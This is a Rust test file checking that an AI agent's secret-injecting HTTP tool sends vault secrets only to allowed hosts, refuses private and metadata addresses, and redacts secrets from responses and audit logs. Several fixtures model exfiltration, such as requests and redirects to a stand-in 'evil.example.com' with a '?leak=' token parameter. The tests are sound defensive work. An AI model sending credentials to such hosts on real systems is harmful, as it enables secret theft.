//! `http_request` through `AgentSession` (spec Seam 1), on a scripted network: a secret goes
//! only to its Entry's allowed hosts, on the first hop and on every redirect; private,
//! loopback and link-local addresses are refused unless the Entry allows the host by name;
//! decisions are keyed on the host; and what comes back, and what the audit log keeps, never
//! holds the secret.

mod support;

use std::collections::BTreeMap;
use std::sync::Arc;

use keefast_agent::http::{BasicAuth, HopResponse, HttpRequest, HttpResponse, MAX_RESPONSE_BODY};
use keefast_agent::{
    AgentDecision, AgentError, AgentRequest, AgentSession, AgentSettingsExt, AgentUse, Approval,
    AuditOutcome, DefaultAgentPolicy,
};
use keefast_core::{EntryFields, EntryId};
use keefast_workspace::VaultId;
use secrecy::SecretString;
use support::{
    FakeApprover, FakeClock, FakeNetwork, KEEPASSXC_KDBX4, MemoryAudit, SharedVault, VaultFile,
};

const TOKEN: &str = "ghp_the-github-token-value";
const REDACTED: &str = "[redacted by keefast]";

/// A Vault whose Agent group has a pairing, `claude`, with an Entry `GitHub` holding
/// [`TOKEN`], allowed to go to `api.github.com`, and a Default agent policy of allow.
struct Fixture {
    shared: Arc<SharedVault>,
    vault: VaultId,
    session: AgentSession,
    audit: Arc<MemoryAudit>,
    approver: Arc<FakeApprover>,
    network: Arc<FakeNetwork>,
    github: EntryId,
    _file: VaultFile,
}

impl Fixture {
    fn new() -> Self {
        let file = VaultFile::from_fixture(KEEPASSXC_KDBX4);
        let (mut workspace, vault) = file.open(&FakeClock::at_unix_seconds(1_900_000_000));
        let root = workspace.readable_vault(vault).unwrap().vault().root().id();
        let agents = workspace.create_group(vault, root, "Agents").unwrap();
        workspace.set_agent_group(vault, agents).unwrap();
        let created = workspace
            .create_agent_pairing(vault, "claude", vec![], false)
            .unwrap();
        let fields = EntryFields {
            title: "GitHub".to_owned(),
            username: "octocat".to_owned(),
            password: SecretString::from(TOKEN.to_owned()),
            ..EntryFields::default()
        };
        let github = workspace
            .create_entry(vault, created.pairing.group(), &fields)
            .unwrap();
        workspace
            .set_agent_allowed_hosts(vault, github, &["api.github.com".to_owned()])
            .unwrap();
        workspace
            .set_default_agent_policy(vault, DefaultAgentPolicy::Allow)
            .unwrap();
        let audit = Arc::new(MemoryAudit::default());
        let approver = FakeApprover::answering([]);
        let network = FakeNetwork::new();
        network.resolves("api.github.com", &["140.82.112.6"]);
        Self {
            session: AgentSession::new(created.pairing.id().clone(), audit.clone())
                .with_approver(approver.clone())
                .with_transport(network.clone()),
            audit,
            approver,
            network,
            github,
            shared: SharedVault::new(workspace, vault),
            vault,
            _file: file,
        }
    }

    fn allow_hosts(&self, hosts: &[&str]) {
        let hosts: Vec<String> = hosts.iter().map(|h| h.to_string()).collect();
        self.shared
            .workspace()
            .set_agent_allowed_hosts(self.vault, self.github, &hosts)
            .unwrap();
    }

    fn send(&self, request: HttpRequest) -> Result<HttpResponse, AgentError> {
        self.session
            .handle(&*self.shared, AgentRequest::Http(request))
            .map(|reply| reply.into_http().unwrap())
    }
}

/// A request to `url` with the GitHub token as its bearer token.
fn bearer(method: &str, url: &str) -> HttpRequest {
    HttpRequest {
        method: method.to_owned(),
        url: url.to_owned(),
        headers: BTreeMap::from([(
            "Authorization".to_owned(),
            "Bearer {{secret:claude/GitHub#password}}".to_owned(),
        )]),
        ..HttpRequest::default()
    }
}

fn header<'a>(headers: &'a [(String, String)], name: &str) -> Option<&'a str> {
    headers
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case(name))
        .map(|(_, v)| v.as_str())
}

#[test]
fn a_request_to_an_allowed_host_carries_the_secret_and_comes_back_with_it_redacted() {
    let fixture = Fixture::new();
    fixture.network.answers(
        "https://api.github.com/user",
        200,
        &[("content-type", "application/json"), ("x-echo", TOKEN)],
        format!("{{\"login\":\"octocat\",\"echo\":\"{TOKEN}\"}}").as_bytes(),
    );

    let response = fixture
        .send(bearer("get", "https://api.github.com/user"))
        .unwrap();

    let sent = fixture.network.sent();
    assert_eq!(sent.len(), 1);
    assert_eq!(sent[0].method, "GET");
    assert_eq!(sent[0].url, "https://api.github.com/user");
    assert_eq!(
        sent[0].addresses,
        ["140.82.112.6".parse::<std::net::IpAddr>().unwrap()]
    );
    assert_eq!(
        header(&sent[0].headers, "authorization"),
        Some(format!("Bearer {TOKEN}").as_str())
    );
    assert_eq!(response.status, 200);
    assert_eq!(response.url, "https://api.github.com/user");
    assert_eq!(
        response.body,
        format!("{{\"login\":\"octocat\",\"echo\":\"{REDACTED}\"}}")
    );
    assert_eq!(response.body_encoding, "utf-8");
    assert_eq!(header(&response.headers, "x-echo"), Some(REDACTED));
    assert_eq!(
        header(&response.headers, "content-type"),
        Some("application/json")
    );
}

#[test]
fn placeholders_fill_the_query_body_and_basic_auth_and_a_value_in_a_url_is_encoded() {
    let fixture = Fixture::new();
    fixture
        .shared
        .workspace()
        .update_entry(
            fixture.vault,
            fixture.github,
            &EntryFields {
                title: "GitHub".to_owned(),
                username: "octo cat".to_owned(),
                password: SecretString::from(TOKEN.to_owned()),
                ..EntryFields::default()
            },
        )
        .unwrap();

    fixture
        .send(HttpRequest {
            method: "POST".to_owned(),
            url: "https://api.github.com/search?user={{secret:claude/GitHub#username}}".to_owned(),
            body: Some("{\"token\":\"{{secret:claude/GitHub#password}}\"}".to_owned()),
            basic_auth: Some(BasicAuth {
                username: "{{secret:claude/GitHub#username}}".to_owned(),
                password: "{{secret:claude/GitHub#password}}".to_owned(),
            }),
            ..HttpRequest::default()
        })
        .unwrap();

    let sent = &fixture.network.sent()[0];
    assert_eq!(sent.url, "https://api.github.com/search?user=octo%20cat");
    assert_eq!(
        sent.body.as_deref(),
        Some(format!("{{\"token\":\"{TOKEN}\"}}").as_bytes())
    );
    // base64("octo cat:ghp_the-github-token-value")
    assert_eq!(
        header(&sent.headers, "authorization"),
        Some("Basic b2N0byBjYXQ6Z2hwX3RoZS1naXRodWItdG9rZW4tdmFsdWU=")
    );
}

#[test]
fn a_host_the_entry_doesnt_allow_is_refused_without_sending_or_asking() {
    let fixture = Fixture::new();
    fixture
        .network
        .resolves("evil.example.com", &["93.184.216.34"]);
    fixture
        .shared
        .workspace()
        .set_default_agent_policy(fixture.vault, DefaultAgentPolicy::Ask)
        .unwrap();

    for url in [
        "https://evil.example.com/steal",
        "https://127.0.0.1/",
        "https://localhost/",
        "https://api.github.com.evil.example.com/",
    ] {
        let refused = fixture.send(bearer("GET", url));
        assert!(
            matches!(&refused, Err(AgentError::HostNotAllowed { reference, .. }) if reference == "claude/GitHub#password"),
            "{url}: {refused:?}"
        );
    }
    assert!(fixture.network.sent().is_empty());
    assert!(fixture.approver.prompts().is_empty());
}

#[test]
fn an_entry_without_allowed_hosts_sends_its_secret_nowhere() {
    let fixture = Fixture::new();
    fixture.allow_hosts(&[]);

    let refused = fixture.send(bearer("GET", "https://api.github.com/user"));

    assert!(
        matches!(refused, Err(AgentError::HostNotAllowed { .. })),
        "{refused:?}"
    );
    assert!(fixture.network.sent().is_empty());
}

#[test]
fn a_redirect_to_another_allowed_host_is_followed_with_the_secret() {
    let fixture = Fixture::new();
    fixture.allow_hosts(&["api.github.com", "uploads.github.com"]);
    fixture
        .network
        .resolves("uploads.github.com", &["140.82.112.7"]);
    fixture.network.redirects(
        "https://api.github.com/upload",
        307,
        "https://uploads.github.com/upload?x=1",
    );
    fixture
        .network
        .answers("https://uploads.github.com/upload?x=1", 201, &[], b"done");

    let mut request = bearer("POST", "https://api.github.com/upload");
    request.body = Some("payload".to_owned());
    let response = fixture.send(request).unwrap();

    assert_eq!(response.status, 201);
    assert_eq!(response.url, "https://uploads.github.com/upload?x=1");
    let sent = fixture.network.sent();
    assert_eq!(sent.len(), 2);
    assert_eq!(sent[1].method, "POST");
    assert_eq!(sent[1].body.as_deref(), Some(&b"payload"[..]));
    assert_eq!(
        header(&sent[1].headers, "authorization"),
        Some(format!("Bearer {TOKEN}").as_str())
    );
}

#[test]
fn a_303_redirect_is_followed_as_a_get_without_the_body() {
    let fixture = Fixture::new();
    fixture
        .network
        .redirects("https://api.github.com/a", 303, "/b");

    let mut request = bearer("POST", "https://api.github.com/a");
    request.body = Some("payload".to_owned());
    fixture.send(request).unwrap();

    let sent = fixture.network.sent();
    assert_eq!(sent[1].method, "GET");
    assert_eq!(sent[1].url, "https://api.github.com/b");
    assert_eq!(sent[1].body, None);
}

#[test]
fn a_redirect_to_a_host_the_entry_doesnt_allow_is_refused_before_the_secret_goes_there() {
    let fixture = Fixture::new();
    fixture
        .network
        .resolves("evil.example.com", &["93.184.216.34"]);
    fixture.network.redirects(
        "https://api.github.com/user",
        302,
        &format!("https://evil.example.com/?leak={TOKEN}"),
    );

    let refused = fixture.send(bearer("GET", "https://api.github.com/user"));

    assert!(
        matches!(&refused, Err(AgentError::RedirectNotAllowed { host, .. }) if host == "evil.example.com"),
        "{refused:?}"
    );
    assert_eq!(fixture.network.sent().len(), 1);
    assert!(!format!("{refused:?}").contains(TOKEN));
}

#[test]
fn redirects_stop_after_five() {
    let fixture = Fixture::new();
    for n in 0..10 {
        fixture.network.redirects(
            &format!("https://api.github.com/{n}"),
            302,
            &format!("/{}", n + 1),
        );
    }

    let refused = fixture.send(bearer("GET", "https://api.github.com/0"));

    assert!(
        matches!(refused, Err(AgentError::TooManyRedirects(5))),
        "{refused:?}"
    );
    assert_eq!(fixture.network.sent().len(), 6);
}

#[test]
fn a_host_allowed_by_a_wildcard_that_resolves_to_a_private_address_is_refused() {
    let fixture = Fixture::new();
    fixture.allow_hosts(&["*.example.com"]);
    fixture
        .network
        .resolves("rebound.example.com", &["93.184.216.34", "127.0.0.1"]);
    fixture
        .network
        .resolves("metadata.example.com", &["169.254.169.254"]);
    fixture
        .network
        .resolves("lan.example.com", &["192.168.1.20"]);
    fixture.network.resolves("v6.example.com", &["::1"]);
    fixture
        .network
        .resolves("mapped.example.com", &["::ffff:10.0.0.1"]);
    // Teredo tunnels, and the local-use NAT64 prefix, which may lead anywhere.
    fixture.network.resolves(
        "teredo.example.com",
        &["2001:0:4136:e378:8000:63bf:3fff:fdd2"],
    );
    fixture
        .network
        .resolves("nat64.example.com", &["64:ff9b:1::a00:1"]);

    for host in [
        "rebound", "metadata", "lan", "v6", "mapped", "teredo", "nat64",
    ] {
        let url = format!("https://{host}.example.com/");
        let refused = fixture.send(bearer("GET", &url));
        assert!(
            matches!(&refused, Err(AgentError::PrivateAddress { .. })),
            "{url}: {refused:?}"
        );
    }
    assert!(fixture.network.sent().is_empty());
}

#[test]
fn a_redirect_to_a_private_address_is_refused() {
    let fixture = Fixture::new();
    fixture.allow_hosts(&["api.github.com", "*.github.com"]);
    fixture
        .network
        .resolves("internal.github.com", &["10.1.2.3"]);
    fixture.network.redirects(
        "https://api.github.com/user",
        301,
        "https://internal.github.com/admin",
    );

    let refused = fixture.send(bearer("GET", "https://api.github.com/user"));

    assert!(
        matches!(&refused, Err(AgentError::PrivateAddress { host, address }) if host == "internal.github.com" && address == "10.1.2.3"),
        "{refused:?}"
    );
    assert_eq!(fixture.network.sent().len(), 1);
}

#[test]
fn a_host_allowed_by_name_may_be_private_and_reached_over_plain_http() {
    let fixture = Fixture::new();
    fixture.allow_hosts(&["nas.lan", "127.0.0.1"]);
    fixture.network.resolves("nas.lan", &["192.168.1.10"]);

    fixture
        .send(bearer("GET", "http://nas.lan:5000/api"))
        .unwrap();
    fixture
        .send(bearer("GET", "http://127.0.0.1:8080/"))
        .unwrap();

    let sent = fixture.network.sent();
    assert_eq!(sent[0].url, "http://nas.lan:5000/api");
    assert_eq!(
        sent[1].addresses,
        ["127.0.0.1".parse::<std::net::IpAddr>().unwrap()]
    );
}

#[test]
fn plain_http_to_a_public_address_is_refused() {
    let fixture = Fixture::new();

    let refused = fixture.send(bearer("GET", "http://api.github.com/user"));

    assert!(
        matches!(refused, Err(AgentError::BadHttpRequest(_))),
        "{refused:?}"
    );
    assert!(fixture.network.sent().is_empty());
}

#[test]
fn requests_keefast_wont_send_are_refused_with_what_to_change() {
    let fixture = Fixture::new();
    let with_header = |name: &str| {
        let mut request = bearer("GET", "https://api.github.com/");
        request.headers.insert(name.to_owned(), "x".to_owned());
        request
    };
    let mut too_big = bearer("POST", "https://api.github.com/");
    too_big.body = Some("x".repeat(keefast_agent::http::MAX_REQUEST_BODY + 1));
    let mut two_auths = bearer("GET", "https://api.github.com/");
    two_auths.basic_auth = Some(BasicAuth::default());

    let cases = [
        (
            "no secret",
            HttpRequest {
                method: "GET".to_owned(),
                url: "https://api.github.com/".to_owned(),
                ..HttpRequest::default()
            },
        ),
        (
            "secret in the host",
            bearer(
                "GET",
                "https://{{secret:claude/GitHub#username}}.github.com/",
            ),
        ),
        ("not a URL", bearer("GET", "api.github.com/user")),
        ("ftp", bearer("GET", "ftp://api.github.com/")),
        ("bad method", bearer("GE T", "https://api.github.com/")),
        (
            "unclosed",
            bearer(
                "GET",
                "https://api.github.com/{{secret:claude/GitHub#password",
            ),
        ),
        ("Host header", with_header("Host")),
        ("Content-Length", with_header("content-length")),
        ("bad header name", with_header("x y")),
        ("too big", too_big),
        ("two auths", two_auths),
    ];
    for (what, request) in cases {
        let refused = fixture.send(request);
        assert!(
            matches!(
                refused,
                Err(AgentError::NoSecret | AgentError::BadHttpRequest(_))
            ),
            "{what}: {refused:?}"
        );
    }
    assert!(fixture.network.sent().is_empty());
}

#[test]
fn an_unknown_reference_is_refused_as_in_run() {
    let fixture = Fixture::new();
    let mut request = bearer("GET", "https://api.github.com/");
    request.headers.insert(
        "X-Other".to_owned(),
        "{{secret:claude/Nope#password}}".to_owned(),
    );

    let refused = fixture.send(request);

    assert!(
        matches!(refused, Err(AgentError::UnknownReference(_))),
        "{refused:?}"
    );
}

#[test]
fn decisions_are_kept_per_host_and_a_prompt_shows_the_request_without_the_secret() {
    let fixture = Fixture::new();
    fixture
        .shared
        .workspace()
        .set_default_agent_policy(fixture.vault, DefaultAgentPolicy::Ask)
        .unwrap();
    fixture.approver.answer(Approval::Allow { remember: true });

    fixture
        .send(bearer(
            "GET",
            "https://api.github.com/user?q={{secret:claude/GitHub#username}}",
        ))
        .unwrap();
    fixture
        .send(bearer("GET", "https://api.github.com/user"))
        .unwrap();

    let prompts = fixture.approver.prompts();
    assert_eq!(prompts.len(), 1, "the remembered answer doesn't ask again");
    let prompt = &prompts[0];
    assert_eq!(prompt.host.as_deref(), Some("api.github.com"));
    assert_eq!(prompt.program, "api.github.com");
    assert_eq!(
        prompt.command,
        [
            "GET",
            "https://api.github.com/user?q={{secret:claude/GitHub#username}}"
        ]
    );
    assert!(prompt.can_remember);
    let settings = fixture
        .shared
        .workspace()
        .agent_settings(fixture.vault)
        .unwrap();
    let pairing = fixture.session.pairing();
    assert_eq!(
        settings.decision(
            fixture.github,
            pairing,
            &AgentUse::Host("api.github.com".to_owned())
        ),
        Some(AgentDecision::Allow)
    );
    assert_eq!(
        settings.decision(
            fixture.github,
            pairing,
            &AgentUse::Program("api.github.com".to_owned())
        ),
        None
    );
}

#[test]
fn a_denied_host_is_refused_without_sending() {
    let fixture = Fixture::new();
    let pairing = fixture.session.pairing().clone();
    fixture
        .shared
        .workspace()
        .remember_agent_decision(
            fixture.vault,
            fixture.github,
            &pairing,
            &AgentUse::Host("api.github.com".to_owned()),
            AgentDecision::Deny,
        )
        .unwrap();

    let refused = fixture.send(bearer("GET", "https://api.github.com/user"));

    assert!(
        matches!(refused, Err(AgentError::Denied { .. })),
        "{refused:?}"
    );
    assert!(fixture.network.sent().is_empty());
}

#[test]
fn a_body_cut_off_in_the_middle_of_a_secret_never_shows_its_start() {
    let fixture = Fixture::new();
    let mut body = vec![b'.'; MAX_RESPONSE_BODY - 5];
    body.extend_from_slice(&TOKEN.as_bytes()[..5]);
    fixture.network.answers_with(
        "https://api.github.com/big",
        HopResponse {
            status: 200,
            headers: vec![],
            body,
            truncated: true,
        },
    );

    let response = fixture
        .send(bearer("GET", "https://api.github.com/big"))
        .unwrap();

    assert!(response.truncated);
    assert!(
        response.body.ends_with('.'),
        "{}",
        &response.body[response.body.len() - 10..]
    );
}

#[test]
fn a_body_that_isnt_text_comes_back_in_base64() {
    let fixture = Fixture::new();
    fixture
        .network
        .answers("https://api.github.com/bin", 200, &[], &[0xff, 0x00, 0x01]);

    let response = fixture
        .send(bearer("GET", "https://api.github.com/bin"))
        .unwrap();

    assert_eq!(response.body_encoding, "base64");
    assert_eq!(response.body, "/wAB");
}

#[test]
fn each_request_is_audited_with_its_method_and_host_and_never_a_value() {
    let fixture = Fixture::new();
    fixture
        .network
        .resolves("evil.example.com", &["93.184.216.34"]);
    fixture.network.redirects(
        "https://api.github.com/r",
        302,
        &format!("https://evil.example.com/?leak={TOKEN}"),
    );

    fixture
        .send(bearer("POST", "https://api.github.com/user"))
        .unwrap();
    let _ = fixture.send(bearer("GET", "https://evil.example.com/"));
    let _ = fixture.send(bearer("GET", "https://api.github.com/r"));

    let records = fixture.audit.records();
    let summary: Vec<_> = records
        .iter()
        .map(|record| {
            (
                record.action.as_str(),
                record.method.as_deref(),
                record.host.as_deref(),
                record.outcome,
            )
        })
        .collect();
    assert_eq!(
        summary,
        [
            (
                "http_request",
                Some("POST"),
                Some("api.github.com"),
                AuditOutcome::Allowed
            ),
            (
                "http_request",
                Some("GET"),
                Some("evil.example.com"),
                AuditOutcome::Denied
            ),
            (
                "http_request",
                Some("GET"),
                Some("api.github.com"),
                AuditOutcome::Allowed
            ),
            (
                "http_request",
                Some("GET"),
                Some("evil.example.com"),
                AuditOutcome::Denied
            ),
        ]
    );
    assert!(
        records
            .iter()
            .all(|record| record.entry.as_ref().unwrap().title == "GitHub")
    );
    let log = serde_json::to_string(&records).unwrap();
    assert!(!log.contains(TOKEN), "{log}");
    assert!(!log.contains("octocat"), "{log}");
}

/// The real network, through a public API's DNS and TLS: run by hand with `--ignored`.
#[test]
#[ignore = "reaches api.github.com"]
fn the_network_transport_reaches_a_public_https_api_at_the_address_it_was_given() {
    let fixture = Fixture::new();
    let session = AgentSession::new(fixture.session.pairing().clone(), fixture.audit.clone())
        .with_transport(Arc::new(keefast_agent::http::NetworkTransport));

    let response = session
        .handle(
            &*fixture.shared,
            AgentRequest::Http(bearer("GET", "https://api.github.com/user")),
        )
        .unwrap()
        .into_http()
        .unwrap();

    // The token is made up, so GitHub refuses it: what matters is that it was asked.
    assert_eq!(response.status, 401, "{response:?}");
    assert!(
        response.body.contains("Bad credentials"),
        "{}",
        response.body
    );
}
